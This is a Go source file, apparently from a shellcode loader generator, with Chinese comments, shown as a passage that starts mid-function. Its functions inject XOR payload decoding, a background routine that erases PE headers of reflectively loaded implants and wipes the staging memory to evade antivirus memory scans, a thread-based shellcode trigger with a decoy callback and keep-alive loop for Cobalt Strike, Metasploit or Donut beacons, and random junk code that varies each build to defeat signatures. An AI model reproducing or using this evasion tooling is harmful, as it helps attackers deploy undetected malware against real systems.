		if len(tail) < closeLen || tail[:len(arr)] != arr || tail[len(arr):closeLen] != ")))" {
			continue
		}
		hit = true
		stmtEnd := m[1] + closeLen // 整条拷贝调用结束位置（解码块插在其后）
		// 吞掉行尾换行符（兼容 LF 与 CRLF：孤立 \r 会让 Go 编译报错）
		insEnd := stmtEnd
		for insEnd < len(sourceCode) && (sourceCode[insEnd] == '\r' || sourceCode[insEnd] == '\n') {
			insEnd++
		}
		if insEnd == stmtEnd {
			sb.WriteString(sourceCode[last:stmtEnd])
			sb.WriteString("\n")
		} else {
			sb.WriteString(sourceCode[last:insEnd])
		}
		// 取拷贝行所在行首的纯空白缩进（loader45 等拷贝行可能带 ",_,_ = " 前缀，
		// 不能把整段前缀当缩进）
		lineStart := strings.LastIndex(sourceCode[:m[0]], "\n") + 1
		indent := "\t"
		if lineStart >= 0 && lineStart < m[0] {
			if ws := regexp.MustCompile(`^[ \t]*`).FindString(sourceCode[lineStart:m[0]]); ws != "" {
				indent = ws
			}
		}
		sb.WriteString(fmt.Sprintf("%s{\n"+
			"%s\t_otpHalf := len(%s) / 2\n"+
			"%s\t_otpPtr := unsafe.Pointer(%s)\n"+
			"%s\tfor _otpI := 0; _otpI < _otpHalf; _otpI++ {\n"+
			"%s\t\t*(*byte)(unsafe.Add(_otpPtr, uintptr(_otpI))) ^= *(*byte)(unsafe.Add(_otpPtr, uintptr(_otpHalf+_otpI)))\n"+
			"%s\t}\n"+
			"%s\tfor _otpI := _otpHalf; _otpI < len(%s); _otpI++ {\n"+
			"%s\t\t*(*byte)(unsafe.Add(_otpPtr, uintptr(_otpI))) = 0\n"+
			"%s\t}\n"+
			"%s}\n",
			indent, indent, arr, indent, dest, indent, indent, indent, indent, arr, indent, indent, indent))
		last = insEnd
	}
	if !hit {
		return sourceCode, false
	}
	sb.WriteString(sourceCode[last:])
	return sb.String(), true
}

// injectMemHygiene 执行期内存卫生守卫（参考 EasyShell 打火绒 Lotok 家族的处理：
// staging PIC 延迟清零释放 + 反射 PE 头抹除）。生成期注入一段后台 goroutine：
//   - 延迟 1.5~3s（每次生成随机）后做一轮进程内存巡检；
//   - 若发现"外来私有大映像"（≥128KB 私有提交分配、非本 loader staging、
//     前 0x400 字节含合法 MZ/PE 头 → 说明 donut/反射加载已把内嵌 PE 映射并
//     迁移执行），则：
//     1) 把本 loader 的 staging 分配清零并翻为 PAGE_NOACCESS（原 PIC 副本
//     不再被使用，扫掉 Lotok 命中 ~1-3MB shellcode 区的窗口）；
//     2) 抹掉该外来映像的 PE 头（SizeOfHeaders，上限 16KB），降低
//     "私有区带 MZ/PE 头"的内存特征。
//   - 未发现外来映像（纯 raw shellcode 就地执行）则一律不动，
//     避免打断仍在 staging 内执行的载荷。
//
// 仅在标准 "addr,_,_ := VirtualAlloc.Call(...len(byteArray))" 家族模板上命中；
// 不命中（loader10 白加黑 / loader53 函数指针族 / 分离远程非标族）时原样返回。
func injectMemHygiene(sourceCode string) string {
	// 前置条件：unsafe 与 windows 均已 import（同族模板必然满足）
	if !regexp.MustCompile(`(?m)^[ \t]*"unsafe"\r?\n`).MatchString(sourceCode) ||
		!regexp.MustCompile(`"golang.org/x/sys/windows"`).MatchString(sourceCode) {
		return sourceCode
	}
	allocRe := regexp.MustCompile(`(?m)^([ \t]*)addr, _, _ := VirtualAlloc\.Call\(0, uintptr\(len\(byteArray\)\)`)
	// 先在原始源码上确认锚点存在；不存在直接原样返回（绝不改动 import）
	if !allocRe.MatchString(sourceCode) {
		return sourceCode
	}
	// 需要 time/os/strconv（同文件多处注入时仅补一次）。import 插入会改变后续字节偏移，
	// 因此插入完成后必须重新匹配锚点，保证 m 与最终源码一致。
	needImports := map[string]bool{"time": true, "os": true, "strconv": true}
	for _, im := range []string{"time", "os", "strconv"} {
		if regexp.MustCompile(`(?m)^[ \t]*"` + im + `"\r?\n`).MatchString(sourceCode) {
			needImports[im] = false
		}
	}
	if needImports["time"] || needImports["os"] || needImports["strconv"] {
		var lines []string
		for _, im := range []string{"time", "os", "strconv"} {
			if needImports[im] {
				lines = append(lines, "\t\""+im+"\"")
			}
		}
		insert := strings.Join(lines, "\n") + "\n"
		sourceCode = regexp.MustCompile(`(?m)^([ \t]*)("unsafe"\r?\n)`).ReplaceAllString(sourceCode, "$1$2"+insert)
		for _, im := range []string{"time", "os", "strconv"} {
			if needImports[im] && !regexp.MustCompile(`(?m)^[ \t]*"`+im+`"\r?\n`).MatchString(sourceCode) {
				return sourceCode // import 注入失败则放弃，保证产物可编译
			}
		}
	}
	m := allocRe.FindStringSubmatchIndex(sourceCode)
	if m == nil {
		return sourceCode
	}
	delayMs := 1500 + genRandN(1600)
	guard := fmt.Sprintf(`
	// staging 移交契约（与 EasyShell 官方 loader 对齐：那边是无条件写出的）：
	// 把 staging 基址/尺寸交给载荷自己，供 EasyShell 类 stageless beacon 启动后
	// 自清理这块私有可执行区（Lotok.kh 主要命中 2~3MB shellcode 区）。
	// 其它家族（CS/MSF/Donut 独立工具）不读这两个变量，写出无副作用；
	// 早先只在 ≥1MB 时写出，会让小载荷/分阶段 stager 拿不到清理契约。
	os.Setenv("ES_PIC_BASE", strconv.FormatUint(uint64(addr), 10))
	os.Setenv("ES_PIC_SIZE", strconv.FormatUint(uint64(uintptr(len(byteArray))+0x1000), 10))
	// 执行期内存卫生：快轮询巡检，一旦发现 donut/反射加载已把内嵌 PE 映射进本进程
	// （"外来私有 PE 映像"），立即释放 staging 并撕掉该映像的 PE 头
	// （EasyShell 打火绒 Lotok 家族的对策移植）。
	// 历史实现固定 sleep 1.5~3s 才动手：而"私有区里的 MZ/PE 头 + staging 大块可执行区"
	// 正是内存扫描的主要命中特征，等满延迟等于把特征白送给对手一轮扫描
	// （表现为载荷已回连、数秒内进程被杀 = 上线即离线）。这里改为 40ms 复查一次，
	// 命中即清；始终未命中（raw shellcode 就地执行）才退到延迟上限且不动任何内存。
	go func() {
		memStageBase := addr
		memStageSpan := uintptr(len(byteArray)) + 0x10000
		memProc := windows.CurrentProcess()
		memDeadline := time.Now().Add(time.Duration(%d) * time.Millisecond)
		for {
		memFoundPE := false
		var memAddr uintptr
		for {
			var memMbi windows.MemoryBasicInformation
			memErr := windows.VirtualQuery(memAddr, &memMbi, unsafe.Sizeof(memMbi))
			if memErr != nil {
				break
			}
			memAlloc := memMbi.AllocationBase
			if memAlloc == 0 {
				memAlloc = memMbi.BaseAddress
			}
			if memMbi.State == 0x1000 && memMbi.Type == 0x20000 && memMbi.RegionSize >= 128*1024 &&
				memAlloc != memStageBase && memMbi.BaseAddress == memMbi.AllocationBase {
				memHdr := make([]byte, 0x400)
				var memRead uintptr
				_ = windows.ReadProcessMemory(memProc, memAlloc, &memHdr[0], uintptr(len(memHdr)), &memRead)
				memHdrSize := 0
				if len(memHdr) >= 0x40 && memHdr[0] == 0x4D && memHdr[1] == 0x5A {
					memE := int(uint32(memHdr[0x3c]) | uint32(memHdr[0x3d])<<8 | uint32(memHdr[0x3e])<<16 | uint32(memHdr[0x3f])<<24)
					if memE > 0 && memE+0x40 <= len(memHdr) && memHdr[memE] == 0x50 && memHdr[memE+1] == 0x45 {
						memOpt := memE + 24
						memSoh := int(uint32(memHdr[memOpt+0x3c]) | uint32(memHdr[memOpt+0x3d])<<8 | uint32(memHdr[memOpt+0x3e])<<16 | uint32(memHdr[memOpt+0x3f])<<24)
						if memSoh >= 0x200 {
							if memSoh > 0x4000 {
								memSoh = 0x4000
							}
							memHdrSize = memSoh
						}
					}
				}
				if memHdrSize > 0 {
					memFoundPE = true
					var memOld uint32
					_ = windows.VirtualProtect(memAlloc, uintptr(memHdrSize), 0x04, &memOld)
					memSlice := unsafe.Slice((*byte)(unsafe.Pointer(memAlloc)), memHdrSize)
					for memI := range memSlice {
						memSlice[memI] = 0
					}
					_ = windows.VirtualProtect(memAlloc, uintptr(memHdrSize), memOld, &memOld)
				}
			}
			memNext := memMbi.BaseAddress + memMbi.RegionSize
			if memNext <= memAddr {
				break
			}
			memAddr = memNext
		}
		if memFoundPE {
			var memCur uintptr = memStageBase
			var memLimit uintptr = memStageBase + memStageSpan
			for memCur < memLimit {
				var memMbi windows.MemoryBasicInformation
				memErr := windows.VirtualQuery(memCur, &memMbi, unsafe.Sizeof(memMbi))
				if memErr != nil {
					break
				}
				if memMbi.AllocationBase != memStageBase {
					if memMbi.BaseAddress >= memLimit {
						break
					}
					memCur = memMbi.BaseAddress + memMbi.RegionSize
					continue
				}
				if memMbi.State == 0x1000 {
					var memOld2 uint32
					_ = windows.VirtualProtect(memMbi.BaseAddress, memMbi.RegionSize, 0x04, &memOld2)
					memZ := unsafe.Slice((*byte)(unsafe.Pointer(memMbi.BaseAddress)), memMbi.RegionSize)
					for memZi := range memZ {
						memZ[memZi] = 0
					}
					_ = windows.VirtualProtect(memMbi.BaseAddress, memMbi.RegionSize, 0x01, &memOld2)
				}
				memNext := memMbi.BaseAddress + memMbi.RegionSize
				if memNext <= memCur {
					break
				}
				memCur = memNext
			}
			return
		}
		if !time.Now().Before(memDeadline) {
			return
		}
		time.Sleep(40 * time.Millisecond)
		}
	}()
`, delayMs)
	// 插到 VirtualAlloc 调用语句括号闭合之后（兼容跨行书写与 CRLF）
	insPos := m[1]
	depth := 1
	for insPos < len(sourceCode) && depth > 0 {
		switch sourceCode[insPos] {
		case '(':
			depth++
		case ')':
			depth--
		}
		insPos++
	}
	if nl := strings.Index(sourceCode[insPos:], "\n"); nl >= 0 {
		insPos += nl + 1
	} else {
		insPos = len(sourceCode)
	}
	return sourceCode[:insPos] + guard + sourceCode[insPos:]
}

// genRandN 生成期随机整数（crypto/rand）。
func genRandN(max int) int {
	if max <= 0 {
		return 0
	}
	v, err := rand.Int(rand.Reader, big.NewInt(int64(max)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}

// injectTriggerThread 触发阶段通用化：把"在 call gadget 回调里就地执行载荷"改成
//
//	独立线程（32MB 栈保留、入口即 shellcode 本体）执行 → WaitForSingleObject → 永久保活，
//	原 call gadget 以"无害回调"同形保留（只维持调用外形，不再承载载荷执行）。
//
// 依据（EasyShell 侧写死的契约 + 两边的实测差异）：
//  1. 官方 loader（module/EnumWindows_payload）、picrun、perun 全部是
//     `CreateThread(0, 32MB, shellcode, ...)`：**入口即 shellcode、独立线程**。
//     pemap 等 stub 会在调用线程上完成 TLS/CRT 初始化并 jmp 进入口，其 asm 注释明确要求
//     "loader 已为 shellcode 线程预留 32MB 栈"；回调族把载荷放在 **Go runtime 线程**上执行
//     （该线程的 r14=G、栈保证、Go 自己的 VEH/异常处理都不属于载荷），反射加载类载荷极易
//     在此宿主上异常。
//  2. 部分载荷（Donut thread_exit/legacy、spawnpe、分离/远程 stager）会在自己创建的线程或
//     子进程里运行、入口随即返回：原实现触发语句之后 main 直接返回 = 宿主进程退出，
//     刚上线的会话立刻掉线。
//  3. 回调族（EnumWindows / EnumDesktopsW / EnumLanguageGroupLocalesW…）会按窗口/桌面/语言组
//     反复回调：入口一旦返回，同一进程会重复加载同一个植入体，第二个实例撞上植入体自带的
//     单实例门禁后会静默 ExitProcess，把已经上线的实例一起带走。独立线程只执行一次即根除。
//
// 仅在"单行 Call gadget（实参里含 addr）"的标准族模板上生效；未命中一律原样返回，保证可编译。
func injectTriggerThread(sourceCode string) string {
	if !regexp.MustCompile(`(?m)^[ \t]*"unsafe"\r?\n`).MatchString(sourceCode) ||
		!regexp.MustCompile(`"golang.org/x/sys/windows"`).MatchString(sourceCode) {
		return sourceCode
	}
	// cgo/白加黑（loader10 的 DLL 形态）不套用本注入：触发语句位于**导出函数**内、由白程序
	// 调用触发，导出函数必须正常返回给调用方；且宿主进程（白程序）本身就长期驻留，
	// 不需要、也不能在这里做"永久保活"。该链路由 TestBaiJiaHeiDllExecutesPayload 专项覆盖。
	if strings.Contains(sourceCode, `import "C"`) {
		return sourceCode
	}
	// 触发语句 = 全文最后一条"实参里带 addr 的 X.Call(...)"。
	// （VirtualAlloc/VirtualProtect/RtlMoveMemory 也会先命中，取最后一条即模板末尾的触发 gadget）
	triggerRe := regexp.MustCompile(`(?m)^([ \t]*)([A-Za-z_][A-Za-z0-9_]*)\.Call\(([^\n]*?)\baddr\b([^\n]*?)\)[ \t]*\r?$`)
	all := triggerRe.FindAllStringSubmatchIndex(sourceCode, -1)
	if len(all) == 0 {
		return sourceCode
	}
	m := all[len(all)-1]
	triggerLine := strings.TrimSpace(sourceCode[m[0]:m[1]])
	if triggerLine == "" || !strings.Contains(triggerLine, ".Call(") {
		return sourceCode
	}

	// DbgHelp 族（loader14：EnumDirTreeW）保持模板原逻辑：该 API 会带着 DbgHelp 状态把目录树
	// 走一遍（实测首个回调前耗时数十秒），拿它当诱饵既慢又不安全；原样让载荷直接充当它的回调，
	// 由模板自身的调用链驱动 —— 这是该模板本来就被验证过的行为。
	if strings.Contains(sourceCode, `"EnumDirTreeW"`) {
		return sourceCode
	}
	// syscall / time 需要时补齐（与 injectMemHygiene 同样的做法：注入失败即放弃）
	var added bool
	for _, im := range []string{"syscall", "time"} {
		sourceCode, added = ensureStdImport(sourceCode, im)
		if !added {
			return sourceCode
		}
	}
	// 重新定位：import 插入改变了字节偏移
	all = triggerRe.FindAllStringSubmatchIndex(sourceCode, -1)
	if len(all) == 0 {
		return sourceCode
	}
	m = all[len(all)-1]
	indent := sourceCode[m[2]:m[3]]

	// 原 gadget 行改写成"无害诱饵调用"：Proc 变量与各辅助实参仍被使用（否则 declared and
	// not used 编译不过），调用外形（EnumChildWindows/EnumDesktopsW/…）原样保留，
	// 只是回调不再指向载荷；诱饵返回 0(FALSE)，枚举类 API 在第一次回调后立即结束。
	procRef := sourceCode[m[4]:m[5]]
	preArgs := sourceCode[m[6]:m[7]]
	postArgs := sourceCode[m[8]:m[9]]
	decoyLine := fmt.Sprintf("%s.Call(%s_trigDecoy%s)", procRef, preArgs, postArgs)

	block := fmt.Sprintf(`%s// 触发通用化：载荷改由"独立线程 + 32MB 栈保留"执行，线程入口即 shellcode 本体
%s// —— EasyShell 官方 loader / picrun / perun 全部走这条路径；反射加载类载荷（pemap /
%s// donut / spawnpe）不再把 Go runtime 线程当宿主线程，线程只执行一次，彻底消除
%s// "回调反复进入 → 同进程重复加载 → 单实例门禁 ExitProcess"。
%s// 原 call gadget 以无害回调同形保留（返回 FALSE，枚举只走一次），维持调用外形与导入特征。
%s_trigDecoy := syscall.NewCallback(func(_, _ uintptr) uintptr { return 0 })
%s%s
%s_trigK32 := windows.NewLazyDLL("kernel32.dll")
%s_trigCreateThread := _trigK32.NewProc("CreateThread")
%s_trigWait := _trigK32.NewProc("WaitForSingleObject")
%s_trigHandle, _, _ := _trigCreateThread.Call(0, 32*1024*1024, addr, 0, 0x00040000, 0)
%s_, _, _ = _trigWait.Call(_trigHandle, 30000)
%s// 保活：载荷可能运行在自己创建的线程/子进程里（Donut thread_exit / spawnpe / 分离远程），
%s// main 返回会让宿主进程退出、已上线会话随即掉线
%sfor {
%s%stime.Sleep(time.Hour)
%s}
`,
		indent, indent, indent, indent, // 1-4 触发说明注释
		indent,    // 5 诱饵说明注释
		indent,    // 6 _trigDecoy
		indent,    // 7 同形 gadget 行缩进
		decoyLine, // 8 同形 gadget 行本体
		indent,    // 9 _trigK32
		indent,    // 10 _trigCreateThread
		indent,    // 11 _trigWait
		indent,    // 12 _trigHandle
		indent,    // 13 WaitForSingleObject
		indent,    // 14 保活注释1
		indent,    // 15 保活注释2
		indent,    // 16 for {
		indent,    // 17 time.Sleep 缩进1
		indent,    // 18 time.Sleep 缩进2
		indent)    // 19 }
	sourceCode = sourceCode[:m[0]] + block + sourceCode[m[1]:]
	return sourceCode
}

// ensureStdImport 确保标准库 import 存在；返回 (新源码, 是否可用)。
// 已存在视为成功；插入失败返回 (原源码, false) 供调用方放弃注入。
func ensureStdImport(sourceCode, name string) (string, bool) {
	if regexp.MustCompile(`(?m)^[ \t]*"` + name + `"\r?\n`).MatchString(sourceCode) {
		return sourceCode, true
	}
	re := regexp.MustCompile(`(?m)^([ \t]*)("unsafe"\r?\n)`)
	if !re.MatchString(sourceCode) {
		return sourceCode, false
	}
	out := re.ReplaceAllString(sourceCode, "$1$2"+`$1"`+name+`"`+"\n")
	if !regexp.MustCompile(`(?m)^[ \t]*"` + name + `"\r?\n`).MatchString(out) {
		return sourceCode, false
	}
	return out, true
}

// stripLeftoverPlaceholders 剔除整行的 //__XXX__ 占位注释（未启用分支残留的模板标记）
func stripLeftoverPlaceholders(sourceCode string) string {
	var sb strings.Builder
	sb.Grow(len(sourceCode))
	re := regexp.MustCompile(`(?m)^[ \t]*//__[A-Za-z0-9_]+__[ \t]*\r?\n`)
	idx := 0
	for _, m := range re.FindAllStringIndex(sourceCode, -1) {
		sb.WriteString(sourceCode[idx:m[0]])
		idx = m[1]
	}
	sb.WriteString(sourceCode[idx:])
	return sb.String()
}

// injectRandomGoCode 注入随机但有效的Go代码，确保每次生成的源代码都不一样
func injectRandomGoCode(sourceCode string) string {
	// 随机选择一种算法类型生成代码
	algorithmType, _ := rand.Int(rand.Reader, big.NewInt(6))

	var randomCode string
	switch algorithmType.Int64() {
	case 0:
		randomCode = generateMathAlgorithm()
	case 1:
		randomCode = generateArrayAlgorithm()
	case 2:
		randomCode = generateSearchAlgorithm()
	case 3:
		randomCode = generateSortAlgorithm()
	case 4:
		randomCode = generateStringAlgorithm()
	default:
		randomCode = generateUtilsAlgorithm()
	}

	// 在第一个函数定义之前插入随机代码（通常是在import之后）
	// 查找第一个func关键字的位置
	funcIdx := strings.Index(sourceCode, "\nfunc ")
	if funcIdx == -1 {
		funcIdx = strings.Index(sourceCode, "func ")
		if funcIdx == -1 {
			// 如果没有找到func，在文件末尾添加
			return sourceCode + randomCode
		}
	} else {
		funcIdx++ // 跳过换行符
	}

	// 在func之前插入随机代码
	return sourceCode[:funcIdx] + randomCode + "\n" + sourceCode[funcIdx:]
}

// generateMathAlgorithm 生成数学算法代码
func generateMathAlgorithm() string {
	funcName := generateRandomIdentifier()
	baseNum, _ := rand.Int(rand.Reader, big.NewInt(50))
	baseNum.Add(baseNum, big.NewInt(10)) // 10-59
	modulo, _ := rand.Int(rand.Reader, big.NewInt(2000))
	modulo.Add(modulo, big.NewInt(500)) // 500-2499

	return fmt.Sprintf(`
// 计算函数 - 数学运算
func %s() int {
	n := %d
	result := 0
	for i := 1; i <= n; i++ {
		result += i * i
	}
	return result %% %d
}
var _ = %s()
`, funcName, baseNum.Int64(), modulo.Int64(), funcName)
}

// generateArrayAlgorithm 生成数组操作算法代码
func generateArrayAlgorithm() string {
	funcName := generateRandomIdentifier()
	arrSize, _ := rand.Int(rand.Reader, big.NewInt(20))
	arrSize.Add(arrSize, big.NewInt(5)) // 5-24
	multiplier, _ := rand.Int(rand.Reader, big.NewInt(10))
	multiplier.Add(multiplier, big.NewInt(2)) // 2-11
	modulo, _ := rand.Int(rand.Reader, big.NewInt(5000))
	modulo.Add(modulo, big.NewInt(5000)) // 5000-9999

	return fmt.Sprintf(`
// 数组处理函数 - 查找最大值和最小值
func %s() int {
	arr := make([]int, %d)
	sum := 0
	for i := range arr {
		arr[i] = (i + 1) * %d
		sum += arr[i]
	}
	max := arr[0]
	min := arr[0]
	for _, v := range arr {
		if v > max {
			max = v
		}
		if v < min {
			min = v
		}
	}
	return (max + min + sum) %% %d
}
var _ = %s()
`, funcName, arrSize.Int64(), multiplier.Int64(), modulo.Int64(), funcName)
}

// generateSearchAlgorithm 生成查找算法代码
func generateSearchAlgorithm() string {
	funcName := generateRandomIdentifier()
	arrSize, _ := rand.Int(rand.Reader, big.NewInt(15))
	arrSize.Add(arrSize, big.NewInt(10)) // 10-24
	target, _ := rand.Int(rand.Reader, big.NewInt(int64(arrSize.Int64()*10)))
	target.Add(target, big.NewInt(1)) // 1-arrSize*10
	multiplier, _ := rand.Int(rand.Reader, big.NewInt(15))
	multiplier.Add(multiplier, big.NewInt(3)) // 3-17
	returnMultiplier, _ := rand.Int(rand.Reader, big.NewInt(15))
	returnMultiplier.Add(returnMultiplier, big.NewInt(5)) // 5-19
	secondReturnMultiplier, _ := rand.Int(rand.Reader, big.NewInt(15))
	secondReturnMultiplier.Add(secondReturnMultiplier, big.NewInt(3)) // 3-17
	rightBound := arrSize.Int64() - 1

	return fmt.Sprintf(`
// 查找算法 - 二分查找变体
func %s() int {
	target := %d
	arr := make([]int, %d)
	for i := 0; i < %d; i++ {
		arr[i] = i * %d
	}
	left, right := 0, %d
	for left <= right {
		mid := (left + right) / 2
		if arr[mid] == target {
			return mid * %d
		} else if arr[mid] < target {
			left = mid + 1
		} else {
			right = mid - 1
		}
	}
	return (left + right) * %d
}
var _ = %s()
`, funcName, target.Int64(), arrSize.Int64(), arrSize.Int64(), multiplier.Int64(), rightBound, returnMultiplier.Int64(), secondReturnMultiplier.Int64(), funcName)
}

// generateSortAlgorithm 生成排序算法代码
func generateSortAlgorithm() string {
	funcName := generateRandomIdentifier()
	arrSize, _ := rand.Int(rand.Reader, big.NewInt(15))
	arrSize.Add(arrSize, big.NewInt(5)) // 5-19
	multiplier, _ := rand.Int(rand.Reader, big.NewInt(10))
	multiplier.Add(multiplier, big.NewInt(2)) // 2-11
	modulo, _ := rand.Int(rand.Reader, big.NewInt(5000))
	modulo.Add(modulo, big.NewInt(3000)) // 3000-7999

	return fmt.Sprintf(`
// 排序算法 - 插入排序
func %s() int {
	arr := make([]int, %d)
	for i := range arr {
		arr[i] = (%d - i) * %d
	}
	for i := 1; i < len(arr); i++ {
		key := arr[i]
		j := i - 1
		for j >= 0 && arr[j] > key {
			arr[j+1] = arr[j]
			j--
		}
		arr[j+1] = key
	}
	sum := 0
	for _, v := range arr {
		sum += v
	}
	return sum %% %d
}
var _ = %s()
`, funcName, arrSize.Int64(), arrSize.Int64(), multiplier.Int64(), modulo.Int64(), funcName)
}

// generateStringAlgorithm 生成字符串处理算法代码
func generateStringAlgorithm() string {
	funcName := generateRandomIdentifier()
	randomBytes := make([]byte, 8)
	rand.Read(randomBytes)
	randomStr := hex.EncodeToString(randomBytes)[:8]
	modulo, _ := rand.Int(rand.Reader, big.NewInt(5000))
	modulo.Add(modulo, big.NewInt(5000)) // 5000-9999

	return fmt.Sprintf(`
// 字符串处理函数 - 字符统计和转换
func %s() int {
	str := "%s"
	count := 0
	sum := 0
	for i := 0; i < len(str); i++ {
		count++
		sum += int(str[i])
	}
	// 反转字符串逻辑
	result := 0
	for i := len(str) - 1; i >= 0; i-- {
		result += int(str[i]) * (i + 1)
	}
	return (count * sum + result) %% %d
}
var _ = %s()
`, funcName, randomStr, modulo.Int64(), funcName)
}

// generateUtilsAlgorithm 生成工具类算法代码
func generateUtilsAlgorithm() string {
	funcName := generateRandomIdentifier()
	baseNum, _ := rand.Int(rand.Reader, big.NewInt(100))
	baseNum.Add(baseNum, big.NewInt(20)) // 20-119
	primeMultiplier, _ := rand.Int(rand.Reader, big.NewInt(5))
	primeMultiplier.Add(primeMultiplier, big.NewInt(2)) // 2-6
	modulo, _ := rand.Int(rand.Reader, big.NewInt(5000))
	modulo.Add(modulo, big.NewInt(3000)) // 3000-7999

	return fmt.Sprintf(`
// 工具函数 - 质数判断和因子计算
func %s() int {
	num := %d
	factors := 0
	sum := 0
	for i := 1; i <= num; i++ {
		if num%%i == 0 {
			factors++
			sum += i
		}
	}
	isPrime := factors == 2
	result := sum
	if isPrime {
		result *= %d
	}
	return result %% %d
}
var _ = %s()
`, funcName, baseNum.Int64(), primeMultiplier.Int64(), modulo.Int64(), funcName)
}

// generateRandomIdentifier 生成随机的Go标识符（变量名、函数名等）
func generateRandomIdentifier() string {
	// 生成8-16个字符的随机标识符
	length, _ := rand.Int(rand.Reader, big.NewInt(9))
	length.Add(length, big.NewInt(8)) // 8-16字符

	bytes := make([]byte, length.Int64())
	rand.Read(bytes)

	// 转换为有效的标识符（字母开头，后续可以是字母数字）
	identifier := "g"
	for _, b := range bytes {
		char := 'a' + (b % 26)
		identifier += string(rune(char))
	}

	return identifier
}
